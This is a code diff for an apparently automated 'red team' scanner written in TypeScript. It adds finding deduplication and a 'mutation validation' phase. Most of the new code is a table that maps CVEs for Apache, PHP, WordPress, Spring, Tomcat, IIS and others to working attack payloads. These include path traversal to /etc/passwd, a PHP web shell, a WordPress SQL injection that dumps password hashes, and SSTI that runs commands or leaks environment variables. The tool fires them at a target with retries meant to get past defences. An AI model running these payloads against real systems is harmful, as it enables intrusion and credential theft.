@@ -371,6 +371,222 @@ async function callSecurityScan(scanType: string, target: string, authHeader: st
   }
 }
 
+// ===== Deduplication Engine =====
+function deduplicateFindings(findings: Finding[]): Finding[] {
+  const seen = new Map<string, Finding>();
+  for (const f of findings) {
+    // Create a fingerprint: type + severity + normalized title (strip subdomain prefix)
+    const normTitle = f.title.replace(/^\[[^\]]+\]\s*/, '').toLowerCase().trim();
+    const key = `${f.type}|${normTitle}|${f.severity}`;
+    const existing = seen.get(key);
+    if (!existing) {
+      seen.set(key, f);
+    } else {
+      // Keep the one with higher confidence / verified status
+      if ((f.confidence || 0) > (existing.confidence || 0) || (f.verified && !existing.verified)) {
+        seen.set(key, f);
+      }
+    }
+  }
+  return Array.from(seen.values());
+}
+
+// ===== CVE Mapping for Technologies =====
+const TECH_CVE_MAP: Record<string, { cves: string[]; payloads: { type: string; payload: string }[] }> = {
+  'apache': {
+    cves: ['CVE-2021-41773', 'CVE-2021-42013', 'CVE-2023-25690'],
+    payloads: [
+      { type: 'traversal', payload: '/cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd' },
+      { type: 'traversal', payload: '/icons/.%2e/%2e%2e/%2e%2e/etc/passwd' },
+    ]
+  },
+  'nginx': {
+    cves: ['CVE-2021-23017', 'CVE-2019-20372'],
+    payloads: [
+      { type: 'traversal', payload: '/..%2f..%2f..%2fetc/passwd' },
+      { type: 'ssrf', payload: '/proxy/http://127.0.0.1:80/admin' },
+    ]
+  },
+  'php': {
+    cves: ['CVE-2024-4577', 'CVE-2019-11043'],
+    payloads: [
+      { type: 'cmdi', payload: '<?php system($_GET["cmd"]); ?>' },
+      { type: 'lfi', payload: 'php://filter/convert.base64-encode/resource=index.php' },
+    ]
+  },
+  'wordpress': {
+    cves: ['CVE-2023-2982', 'CVE-2022-21661'],
+    payloads: [
+      { type: 'sqli', payload: "' UNION SELECT 1,user_login,user_pass,4 FROM wp_users--" },
+      { type: 'xss', payload: '<img src=x onerror=alert(document.domain)>' },
+    ]
+  },
+  'node': {
+    cves: ['CVE-2023-32002', 'CVE-2022-32213'],
+    payloads: [
+      { type: 'ssti', payload: '{{constructor.constructor("return this.process.env")()}}' },
+      { type: 'ssrf', payload: 'http://[::1]:3000/admin' },
+    ]
+  },
+  'express': {
+    cves: ['CVE-2022-24999', 'CVE-2024-29041'],
+    payloads: [
+      { type: 'traversal', payload: '..\\..\\..\\..\\etc\\passwd' },
+      { type: 'xss', payload: '"><img/src=x onerror=alert(1)>' },
+    ]
+  },
+  'tomcat': {
+    cves: ['CVE-2020-1938', 'CVE-2024-50379'],
+    payloads: [
+      { type: 'traversal', payload: '/..;/manager/html' },
+      { type: 'traversal', payload: '/%252e%252e/%252e%252e/etc/passwd' },
+    ]
+  },
+  'spring': {
+    cves: ['CVE-2022-22965', 'CVE-2022-22963'],
+    payloads: [
+      { type: 'ssti', payload: '${T(java.lang.Runtime).getRuntime().exec("id")}' },
+      { type: 'cmdi', payload: 'class.module.classLoader.URLs%5B0%5D=0' },
+    ]
+  },
+  'iis': {
+    cves: ['CVE-2021-31166', 'CVE-2017-7269'],
+    payloads: [
+      { type: 'traversal', payload: '/..%255c..%255c..%255cwindows/win.ini' },
+      { type: 'xss', payload: '/%3Cscript%3Ealert(1)%3C/script%3E.aspx' },
+    ]
+  },
+};
+
+// ===== Mutation Validation for Confirmed Findings =====
+async function validateFindingsWithMutation(
+  findings: Finding[], target: string, techStack: string[], authHeader: string
+): Promise<{ validated: Finding[]; mutationResults: any[]; output: string[] }> {
+  const output: string[] = [];
+  const mutationResults: any[] = [];
+  const validated: Finding[] = [];
+
+  // Only validate high/critical exploitable findings
+  const toValidate = findings.filter(f =>
+    (f.severity === 'critical' || f.severity === 'high') && f.exploitable
+  );
+
+  if (toValidate.length === 0) {
+    output.push('[MUTATION] No high/critical exploitable findings to validate');
+    return { validated: findings, mutationResults: [], output };
+  }
+
+  output.push(`[MUTATION] Validating ${toValidate.length} high/critical findings with mutation engine...`);
+
+  // Generate CVE-based payloads from tech stack
+  const techPayloads: { type: string; payload: string; cve: string }[] = [];
+  for (const tech of techStack) {
+    const techLower = tech.toLowerCase();
+    for (const [key, mapping] of Object.entries(TECH_CVE_MAP)) {
+      if (techLower.includes(key)) {
+        for (const p of mapping.payloads) {
+          techPayloads.push({ ...p, cve: mapping.cves[0] || 'N/A' });
+        }
+      }
+    }
+  }
+
+  if (techPayloads.length > 0) {
+    output.push(`[MUTATION] Generated ${techPayloads.length} CVE-mapped payloads for: ${techStack.join(', ')}`);
+  }
+
+  // For each finding, fire a targeted payload through the mutation/retry engine
+  for (const finding of toValidate) {
+    // Pick a relevant payload based on finding type
+    let testPayload = finding.evidence?.raw?.poc || '';
+    const findingType = (finding.type || '').toLowerCase();
+
+    // Try to find a CVE-mapped payload matching the finding type
+    const matchedCVE = techPayloads.find(tp => tp.type === findingType);
+    if (matchedCVE) {
+      testPayload = matchedCVE.payload;
+      output.push(`[MUTATION] Using CVE payload (${matchedCVE.cve}) for ${finding.title}`);
+    }
+
+    if (!testPayload || testPayload.length < 3) {
+      // Generate a generic payload based on finding type
+      const genericPayloads: Record<string, string> = {
+        'xss': '<img src=x onerror=alert(1)>',
+        'sqli': "' OR 1=1 UNION SELECT null,version()--",
+        'lfi': '../../../../etc/passwd',
+        'traversal': '../../../../etc/passwd',
+        'ssrf': 'http://127.0.0.1:80/admin',
+        'ssti': '{{7*7}}',
+        'cmdi': '; id',
+        'cors': '',
+      };
+      testPayload = genericPayloads[findingType] || '';
+    }
+
+    if (!testPayload) {
+      validated.push(finding); // Can't test, keep as-is
+      continue;
+    }
+
+    try {
+      // Call attack-execution-loop to fire + mutate
+      const response = await fetch(`${SUPABASE_URL}/functions/v1/attack-execution-loop`, {
+        method: 'POST',
+        headers: {
+          'Authorization': authHeader,
+          'Content-Type': 'application/json',
+          'apikey': SUPABASE_ANON_KEY,
+        },
+        body: JSON.stringify({
+          target,
+          payloads: [{
+            raw: testPayload,
+            encoded: encodeURIComponent(testPayload),
+            attackType: findingType,
+            parameter: finding.evidence?.raw?.parameter || 'q',
+            injectionPoint: 'query',
+          }],
+          maxRetries: 3,
+          techStack,
+        }),
+      });
+
+      if (response.ok) {
+        const result = await response.json();
+        mutationResults.push({ finding: finding.title, ...result });
+
+        if (result.successCount > 0) {
+          finding.verified = true;
+          finding.confidence = 0.95;
+          output.push(`[MUTATION_SUCCESS] ✅ ${finding.title} — CONFIRMED via mutation (bypass succeeded)`);
+          if (matchedCVE) {
+            finding.description += ` [CVE: ${matchedCVE.cve}]`;
+          }
+        } else if (result.defendedCount > 0) {
+          // Target defended against all mutations — finding may be false positive
+          finding.confidence = Math.max(0.3, (finding.confidence || 0.5) - 0.2);
+          output.push(`[MUTATION_DEFENDED] 🛡️ ${finding.title} — target defended (confidence reduced to ${Math.round(finding.confidence * 100)}%)`);
+        } else {
+          output.push(`[MUTATION_BLOCKED] 🔒 ${finding.title} — all payloads blocked`);
+        }
+      }
+    } catch (e) {
+      output.push(`[MUTATION_ERROR] ${finding.title}: ${e.message}`);
+    }
+
+    validated.push(finding);
+  }
+
+  // Add non-validated findings back
+  for (const f of findings) {
+    if (!toValidate.includes(f)) {
+      validated.push(f);
+    }
+  }
+
+  return { validated: deduplicateFindings(validated), mutationResults, output };
+}
+
 async function executePhase(phase: string, target: string, authHeader: string): Promise<any> {
   const scanTypes = PHASE_SCAN_TYPES[phase] || [];
   const phaseOutput: string[] = [];
@@ -384,7 +600,7 @@ async function executePhase(phase: string, target: string, authHeader: string): 
   );
   const results = await Promise.all(scanPromises);
 
-  const confirmedFindings: Finding[] = [];
+  const rawFindings: Finding[] = [];
   const pendingVerification: Array<{ finding: Finding; verifyWith: string }> = [];
 
   for (const { scanType, result } of results) {
@@ -394,10 +610,9 @@ async function executePhase(phase: string, target: string, authHeader: string): 
 
       for (const finding of scanFindings) {
         const verifyType = VERIFICATION_MAP[scanType];
-        // Low-severity findings (info/low) skip verification to save time
         if (!verifyType || finding.severity === 'info' || finding.severity === 'low') {
           finding.confidence = finding.severity === 'info' ? 0.5 : 0.65;
-          confirmedFindings.push(finding);
+          rawFindings.push(finding);
         } else {
           pendingVerification.push({ finding, verifyWith: verifyType });
         }
@@ -407,17 +622,14 @@ async function executePhase(phase: string, target: string, authHeader: string): 
     }
   }
 
-  // Dual-verification: run verification scans in parallel for all pending findings
+  // Dual-verification
   if (pendingVerification.length > 0) {
     phaseOutput.push(`[${phase}] Verifying ${pendingVerification.length} findings with secondary techniques...`);
     const verifyTypes = [...new Set(pendingVerification.map(p => p.verifyWith))];
-
-    // Run each unique verification scan once (deduplicated)
     const verifyResultMap: Record<string, any> = {};
     await Promise.all(
       verifyTypes.map(async vt => {
-        const vr = await callSecurityScan(vt, target, authHeader);
-        verifyResultMap[vt] = vr;
+        verifyResultMap[vt] = await callSecurityScan(vt, target, authHeader);
       })
     );
 
@@ -427,7 +639,6 @@ async function executePhase(phase: string, target: string, authHeader: string): 
         ? extractFindings(verifyResult, verifyWith, phase, target)
         : [];
 
-      // Confirm if secondary scan also found a similar vulnerability type
       const secondaryConfirms = verifyFindings.some(vf =>
         vf.type === finding.type ||
         vf.title.toLowerCase().includes(finding.type.toLowerCase().split(' ')[0]) ||
@@ -438,18 +649,24 @@ async function executePhase(phase: string, target: string, authHeader: string): 
         finding.confidence = 0.90;
         finding.verified = true;
         phaseOutput.push(`[CONFIRMED] ${finding.title} — verified by ${verifyWith} (confidence: 90%)`);
-        confirmedFindings.push(finding);
+        rawFindings.push(finding);
       } else {
-        // Downgrade but keep with lower confidence; never silently drop
         finding.confidence = 0.45;
         finding.verified = false;
         finding.severity = downgradeOneSeverity(finding.severity);
         phaseOutput.push(`[UNVERIFIED] ${finding.title} — downgraded (${verifyWith} did not confirm)`);
         if (finding.confidence >= 0.4 && finding.severity !== 'info') {
-          confirmedFindings.push(finding); // keep but marked as unverified
+          rawFindings.push(finding);
         }
       }
     }
+  }
+
+  // Deduplicate before returning
+  const confirmedFindings = deduplicateFindings(rawFindings);
+  const dedupRemoved = rawFindings.length - confirmedFindings.length;
+  if (dedupRemoved > 0) {
+    phaseOutput.push(`[DEDUP] Removed ${dedupRemoved} duplicate findings`);
   }
 
   return {
@@ -633,6 +850,32 @@ async function executeContinuousOperation(
   phaseOutputs['exploitation'] = exploitResult.output;
   phaseOutputs['post-exploit'] = postExploitResult.output;
 
+  // Phase 4: Mutation Validation — confirm high/critical findings with payload mutation engine
+  console.log(`[Red Team] Running mutation validation on ${allFindings.length} findings...`);
+  // Detect tech stack from findings
+  const techFromFindings = allFindings
+    .filter(f => f.type?.toLowerCase().includes('technology') || f.tool_used === 'tech')
+    .map(f => f.title.replace(/Technology:\s*/i, '').trim())
+    .filter(Boolean);
+  const techStack = [...new Set(techFromFindings)];
+
+  const mutationValidation = await validateFindingsWithMutation(
+    allFindings, state.target, techStack, authHeader
+  );
+  // Replace allFindings with validated + deduplicated set
+  allFindings.length = 0;
+  allFindings.push(...mutationValidation.validated);
+  phaseOutputs['mutation-validation'] = mutationValidation.output;
+
+  // Global deduplication pass
+  const dedupedFindings = deduplicateFindings(allFindings);
+  const globalDedupRemoved = allFindings.length - dedupedFindings.length;
+  if (globalDedupRemoved > 0) {
+    phaseOutputs['dedup'] = [`[DEDUP] Global pass removed ${globalDedupRemoved} duplicate findings`];
+  }
+  allFindings.length = 0;
+  allFindings.push(...dedupedFindings);
+
   // Correlation
   if (allFindings.length >= 2) {
     const correlations = await correlateFindings(allFindings, { target: state.target });
@@ -641,8 +884,10 @@ async function executeContinuousOperation(
 
   const attackChains = await generateAttackChains(allCorrelations, { target: state.target });
 
-  for (const phase of ['recon', 'scanning', 'subdomain-scan', 'exploitation', 'post-exploit']) {
-    const phaseFindings = allFindings.filter(f => f.phase === phase || (phase === 'subdomain-scan' && f.subdomain));
+  for (const phase of ['recon', 'scanning', 'subdomain-scan', 'exploitation', 'post-exploit', 'mutation-validation']) {
+    const phaseFindings = phase === 'mutation-validation'
+      ? allFindings.filter(f => f.verified === true && f.confidence && f.confidence >= 0.9)
+      : allFindings.filter(f => f.phase === phase || (phase === 'subdomain-scan' && f.subdomain));
     const verifiedCount = phaseFindings.filter((f: any) => f.verified).length;
     learningUpdates.push({
       phase,
@@ -660,6 +905,7 @@ async function executeContinuousOperation(
     attack_chains: attackChains,
     learning_updates: learningUpdates,
     phase_outputs: phaseOutputs,
+    mutation_results: mutationValidation.mutationResults,
     subdomains_discovered: subdomains,
     iterations_completed: 5,
     total_scans: Object.values(PHASE_SCAN_TYPES).flat().length + (subdomains.length * 5)
